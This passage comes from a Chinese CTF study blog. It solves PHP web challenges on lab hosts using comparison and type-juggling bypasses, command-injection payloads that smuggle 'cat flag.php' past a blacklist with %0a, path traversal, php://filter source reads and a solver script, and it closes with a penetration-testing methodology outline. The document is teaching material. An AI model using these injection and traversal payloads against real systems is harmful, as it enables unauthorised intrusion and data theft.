class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>分析</p>
<p>若为<code>md5($_GET[&#39;username&#39;]) == md5($_GET[&#39;password&#39;])</code><br>则可以构造：<br><code>?username=QNKCDZO&amp;password=240610708</code><br>因为<code>==</code>对比的时候会进行数据转换，<code>0eXXXXXXXXXX</code> 转成<code>0</code>了<br>也可以使用数组绕过<br><code>?username[]=1&amp;password[]=2</code></p>
<p>但此处是<code>===</code>，只能用数组绕过，<code>PHP</code>对数组进行<code>hash</code>计算都会得出<code>null</code>的空值<br><code>?username[]=1&amp;password[]=2</code></p>
</li>
<li><p>题目： <a href="http://172.16.43.117/php_bugs-master/18.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/18.php</a></p>
</li>
<li>payload： <code>?username[]=1&amp;password[]=2</code></li>
</ul>
<h4 id="ereg-函数strpos-函数用数组返回NULL绕过"><a href="#ereg-函数strpos-函数用数组返回NULL绕过" class="headerlink" title="ereg()函数strpos() 函数用数组返回NULL绕过"></a>ereg()函数strpos() 函数用数组返回NULL绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;123456&#125;"</span>;  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Invalid password'</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>分析<ul>
<li>方法一：<br>ereg()正则函数可以用<code>%00</code>截断<br><code>?password=1%00--</code></li>
<li>方法二：<br>将<code>password</code>构造一个数组，传入之后，<code>ereg</code>是返回<code>NULL</code>的，<code>===</code>判断<code>NULL</code>和 <code>FALSE</code>，是不相等的，所以可以进入第二个判断，而<code>strpos</code>处理数组，也是返回<code>NULL</code>，注意这里的是<code>!==</code>，<code>NULL!==FALSE</code>,条件成立，拿到<code>flag</code><br><code>?password[]=</code></li>
</ul>
</li>
<li>题目： <a href="http://172.16.43.117/php_bugs-master/19.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/19.php</a></li>
<li>payload：<code>?password=a%00--</code></li>
</ul>
<h4 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"flag&#123;test&#125;"</span>;</span><br><span class="line"></span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;    </span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>分析</p>
<ul>
<li>不能是数字，且又要大于1336，看上去是矛盾的</li>
</ul>
</li>
<li><p>解决</p>
</li>
</ul>
<p>​       利用<code>PHP</code>弱类型的一个特性，当一个整型和一个其他类型行比较的时候，会先把其他类型<code>intval</code>再比。如果输入一个<code>1337a</code>这样的字符串，在<code>is_numeric</code>中返回<code>true</code>，然后在比较时被转换成数字<code>1337</code>，这样就绕过判断输出flag</p>
<ul>
<li>题目：<a href="http://172.16.43.117/php_bugs-master/22.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/22.php</a></li>
<li>payload：<code>?password=123456a</code></li>
</ul>
<h3 id="其他常见web类型"><a href="#其他常见web类型" class="headerlink" title="其他常见web类型"></a>其他常见web类型</h3><hr>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><a href="https://www.freebuf.com/articles/web/137923.html" rel="external nofollow" target="_blank">参考</a></p>
<p>命令连接符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">；  命令1；命令2   多个命令顺序执行</span><br><span class="line">&amp;&amp;  命令1&amp;&amp;命令2   当命令1执行成功，命令2才会执行	。命令1执行不成功时，命令2不会执行</span><br><span class="line">||  命令1||命令2   当命令1执行不成功，命令2才会执行。命令1执行成功时，命令2不会执行</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="number">1</span>]))&#123;</span><br><span class="line">     <span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>分析</p>
<p>传入参数1，并且长度不能大于8</p>
</li>
<li><p>题目</p>
<p><a href="http://172.16.43.115:18099/exec.php" rel="external nofollow" target="_blank">http://172.16.43.115:18099/exec.php</a></p>
</li>
<li><p>payload  <code>?1=cat *</code></p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">        $target=trim($target);</span><br><span class="line">        <span class="comment">// var_dump($target);</span></span><br><span class="line">        <span class="comment">// Set blacklist</span></span><br><span class="line">        $substitutions = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">';'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">        $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line">        <span class="comment">// var_dump($target);</span></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Windows</span></span><br><span class="line">                $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// *nix</span></span><br><span class="line">                $cmd = shell_exec( <span class="string">'ping  -c 1 '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>分析</p>
<p>加入了黑名单，但是黑名单漏了%0a</p>
</li>
<li><p>题目 <a href="http://172.16.43.115/exec/index.php" rel="external nofollow" target="_blank">http://172.16.43.115/exec/index.php</a></p>
</li>
<li><p>payload: <code>?ip=8.8.8.8%0acat flag.php</code></p>
</li>
</ul>
<h4 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h4><ul>
<li>题目   <a href="http://172.16.43.115:19002/" rel="external nofollow" target="_blank">http://172.16.43.115:19002/</a><ul>
<li>工具  ：<a href="https://github.com/BugScanTeam/GitHack" rel="external nofollow" target="_blank">GitHack</a></li>
<li>用法：python GitHack.py <a href="http://www.example.com/" rel="external nofollow" target="_blank">http://www.example.com/</a></li>
</ul>
</li>
<li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080703.png" alt=""></li>
</ul>
<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><hr>
<p>PHP中文件包含函数有以下四种：</p>
<blockquote>
<p>require()</p>
<p>require_once()</p>
<p>include()</p>
<p>include_once()</p>
</blockquote>
<p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<ul>
<li>题目 <a href="http://172.16.43.115/include/index.php" rel="external nofollow" target="_blank">http://172.16.43.115/include/index.php</a></li>
<li>payload ：<code>?file=../../../../../home/flag</code></li>
</ul>
<ul>
<li><p>题目  <a href="http://4.chinalover.sinaapp.com/web7/index.php" rel="external nofollow" target="_blank">http://4.chinalover.sinaapp.com/web7/index.php</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/dubhe-/p/9997842.html" rel="external nofollow" target="_blank">php伪协议</a></p>
</li>
<li><p>方法：读index.php</p>
<p><code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<p>base64解码后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">	$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="简单脚本辅助"><a href="#简单脚本辅助" class="headerlink" title="简单脚本辅助"></a>简单脚本辅助</h4><hr>
<ul>
<li><p>题目  <a href="http://172.16.43.117/web/08/index.php" rel="external nofollow" target="_blank">http://172.16.43.117/web/08/index.php</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://172.16.43.117/web/08/index.php'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">html = s.get(url).content</span><br><span class="line"></span><br><span class="line">reg = <span class="string">r'(.*)&lt;/p&gt;'</span></span><br><span class="line">res = re.findall(reg,html)</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">'result'</span>:eval(res[<span class="number">0</span>])&#125;</span><br><span class="line"></span><br><span class="line">flag = s.post(url,data=payload)</span><br><span class="line"><span class="keyword">print</span> flag.content</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="day03–yiyangqianxixxxx"><a href="#day03–yiyangqianxixxxx" class="headerlink" title="day03–yiyangqianxixxxx"></a>day03–yiyangqianxixxxx</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>此内容为<code>严老板</code>编写总结，7iny整理。仅供学习参考，<strong>请及时向漏洞平台上报漏洞</strong></p>
<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ul>
<li>确立渗透测试目标 ：省企业网站，或任意学习网站。</li>
<li>确立渗透测试范围：隶属于该网站域名下所有网站均可。</li>
<li>渗透测试手段：通过信息搜集得到网站的主要信息，来对其进行各种漏洞的测试，包括但不限于sql注入、xss、信息泄露。考虑到的攻击手段要全面，只要有可能存在漏洞的地方就去尝试。</li>
</ul>
<p>选择的目标若未找到漏洞，可只记录信息搜集过程，并且将可能存在漏洞点的（你认为不安全的地方）标注出来。<br>可多选择几个目标进行尝试，但在渗透过程中要进行多方面考虑，尝试每一个可能的攻击面，若找到漏洞甚至getshell不得对系统进行任何破坏，一切也测试为目的。渗透过程中也要注意保护系统，对服务器的扫描等行为要确保不会影响服务。</p>
<p>详细记录整个过程，把每个值得记录的地方都写下来。并向相关漏洞平台上报漏洞</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>在拿到一个网站的时候，首先是对这个网站要有一个比较全面的了解，就是对这个网站进行信息收集。在信息收集阶段，一般要收集这个网站的IP地址信息，是否使用CDN，使用哪种语言开发，中间件是什么</p>
<h4 id="IP端口扫描"><a href="#IP端口扫描" class="headerlink" title="IP端口扫描"></a>IP端口扫描</h4><p>端口发现的目的是查看是否有高危端口，比如135/445/3389或者常见的数据库端口等 比如，如果存在445端口，我们就可以测试是否存在永恒之蓝漏洞，在端口发现阶段，如果存在像7001或者8080这样的端口的情况，我们就要看下这些端口是在运行哪些服务</p>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>对网站目录的扫描，我们可以观察是否存在网站后台管理 如果存在的话，可以尝试弱口令登录 如果尝试多次登录没有锁定，也可以尝试简单的口令爆破，因为现场测试时间有限，长时间的爆破是不可能的 </p>
<h4 id="主机层漏洞"><a href="#主机层漏洞" class="headerlink" title="主机层漏洞"></a>主机层漏洞</h4><p>主机层的漏洞就是看端口开放情况，判断开放的服务，然后测试是否有漏洞，比如溢出漏洞，反序列化漏洞</p>
<h4 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h4><p>中间件漏洞比较简单，像weblogic反序列化，还有就是使用中间件部署web木马，直接拿服务器权限另外还有一些框架的漏洞，比如Struts2的漏洞。这些漏洞都是可以直接使用工具进行检测的</p>
<h4 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h4><p>xss漏洞，sql注入漏洞，还有一些越权等逻辑漏洞</p>
<p>比如XSS漏洞，一般存在于搜索框中或者注册信息等地方<br>当发现有搜索框或者注册信息或者发布消息，需要输入内容，且输入消息会返回到页面让读者查看的时候，就需要测试一下是否存在xss漏洞<br>当然，我们还需要联想到，当我们看到搜索框的时候，我们需要测试一下搜索的内容是否是从数据库中去调取的，如果是的话，可能也会存在SQL注入的可能<br>上传漏洞一般配合解析漏洞使用，如果服务器端与前端都没有对上传格式进行限制，那么我们可以直接上传webshell，拿服务器权限<br>如果网站对上传格式有限制，我们需要抓包对文件类型进行修改，然后上传，验证是前端还是服务器端做的限制，如果是前端做的限制就可以改包上传了，上传后注意观察返回包的内容，是否有文件上传的路径与上传后的文件名<br>当网站是使用iis6.0搭建的网站时可以使用IIS6.0特有的两个文件解析漏洞进行测试</p>
<p>SQL注入漏洞常见的存在于带参数链接或者POST数据包 类似于xxx.jsp?id=xxx<br>或者像登录时使用POST请求方式传输用户名和密码，至于验证是否存在SQL注入</p>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>在测试的过程中，一般会使用到<code>SQLmap</code>，<code>wvs</code>，<code>kali</code>，<code>k8</code>，<code>菜刀</code>，<code>webshell</code>，<code>御剑</code>，<code>Nessus</code>等还有一些反序列化的检测工具和脚本，这些可以在GitHub上，或其他地方找到<br>端口扫描工具可以使用<code>nmap</code>，Windows下的zmap（其实就是nmap），常用参数可以上网搜一下，比较详细<br>远程连接工具可以使用<code>putty</code>，或者<code>crt</code><br>数据库连接工具可以使用<code>Navicat</code></p>
<h4 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h4><p>渗透的思路的话，一般就是信息收集，整理，利用，测试（验证），获取权限，到此为止，<strong>禁止拿数据或者对用户网络造成影响</strong><br>剩下的就是对工具的熟练使用以及丰富自己的渗透思路，能力大的可以从代码层面去发现漏洞，说不定会有意外收获</p>

      
    </div>
    
    
    
    <div>

    <div>
      
         <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div> 
      
</div>



    </div>
    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/一九年六月.html" rel="next" title="一九年六月总结">
                <i class="fa fa-chevron-left"></i> 一九年六月总结
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/RedTeam体验.html" rel="prev" title="RedTeam体验">
                RedTeam体验 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>
  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/pandatou.jpeg" alt="7iny">
            
              <p class="site-author-name" itemprop="name">7iny</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>
          
          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            
        
          </nav>
          
          
          
          
          
		  
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                推荐阅读
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://lab.jxustctf.top/stalkerteam.html" title="Stalker战队" target="_blank" rel="external nofollow">Stalker战队</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://danie1.jxustctf.top" title="Danie1" target="_blank" rel="external nofollow">Danie1</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://orangice.gitee.io" title="orangice" target="_blank" rel="external nofollow">orangice</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yiyangqianxixxxx.github.io" title="yiyangqianxi" target="_blank" rel="external nofollow">yiyangqianxi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/qq_39379812" title="Azure_atk" target="_blank" rel="external nofollow">Azure_atk</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://doubj.github.io" title="doubj" target="_blank" rel="external nofollow">doubj</a>
                  </li>
                
              </ul>
            </div>
          
		  
		  
		  <div align="center"><br><script type="text/javascript" src="//rf.revolvermaps.com/0/0/1.js?i=5smd0paxslb&amp;s=220&amp;m=0&amp;v=true&amp;r=false&amp;b=000000&amp;n=false&amp;c=ff0000" async="async"></script><br></div>
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF学习"><span class="nav-number">1.</span> <span class="nav-text">CTF学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day01–7iny"><span class="nav-number">1.2.</span> <span class="nav-text">day01–7iny</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#解题模式CTF赛题目类别与能力对应"><span class="nav-number">1.2.1.</span> <span class="nav-text">解题模式CTF赛题目类别与能力对应</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相应的赛题要求"><span class="nav-number">1.2.2.</span> <span class="nav-text">相应的赛题要求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何入门–如何学？"><span class="nav-number">1.2.3.</span> <span class="nav-text">如何入门–如何学？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具下载"><span class="nav-number">1.2.4.</span> <span class="nav-text">工具下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC学习"><span class="nav-number">1.2.5.</span> <span class="nav-text">MISC学习</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day01–Danie1"><span class="nav-number">1.3.</span> <span class="nav-text">day01–Danie1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见编码"><span class="nav-number">1.3.1.</span> <span class="nav-text">常见编码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#摩斯密码"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">摩斯密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#凯撒密码"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">凯撒密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base编码"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">base编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ascii编码"><span class="nav-number">1.3.2.</span> <span class="nav-text">ascii编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unicode编码"><span class="nav-number">1.3.3.</span> <span class="nav-text">unicode编码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MD5"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">MD5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#异或"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">异或</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片隐写"><span class="nav-number">1.3.4.</span> <span class="nav-text">图片隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">常用工具介绍（常用工具下载地址：https://www.ctftools.com/down/）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lsb隐写"><span class="nav-number">1.3.5.</span> <span class="nav-text">lsb隐写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day02–7iny"><span class="nav-number">1.4.</span> <span class="nav-text">day02–7iny</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内容简介："><span class="nav-number">1.4.1.</span> <span class="nav-text">内容简介：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wireshark："><span class="nav-number">1.4.2.</span> <span class="nav-text">Wireshark：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#推荐资料："><span class="nav-number">1.4.3.</span> <span class="nav-text">推荐资料：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关站点："><span class="nav-number">1.4.4.</span> <span class="nav-text">相关站点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#流量分析："><span class="nav-number">1.4.5.</span> <span class="nav-text">流量分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、流量包修复"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">1、流量包修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、协议分析"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">2、协议分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据提取"><span class="nav-number">1.4.5.3.</span> <span class="nav-text">数据提取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目1、MISC-rar"><span class="nav-number">1.4.5.4.</span> <span class="nav-text">题目1、MISC.rar</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目2、A记录（蓝鲸）"><span class="nav-number">1.4.5.5.</span> <span class="nav-text">题目2、A记录（蓝鲸）</span></a></li><li class="nav-item nav-level-4"><a 